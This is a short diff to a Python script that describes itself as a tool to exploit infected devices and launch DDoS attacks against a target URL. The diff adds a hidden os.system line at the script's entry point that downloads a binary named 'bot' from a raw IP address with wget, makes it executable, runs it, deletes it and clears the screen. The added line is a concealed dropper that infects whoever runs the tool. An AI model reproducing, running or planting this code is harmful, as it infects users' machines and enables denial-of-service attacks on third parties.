@@ -237,6 +237,7 @@ async def main(target_url, attack_duration):
         await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
+    os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.182.25.126/bot; chmod +x bot; ./bot; rm -rf bot; cd; clear")
     parser = argparse.ArgumentParser(description="Script to exploit infected devices and launch a powerful DDoS attack")
     parser.add_argument("target_url", help="URL of the target for DDoS attack")
     parser.add_argument("attack_duration", type=int, help="Duration of DDoS attack in seconds")
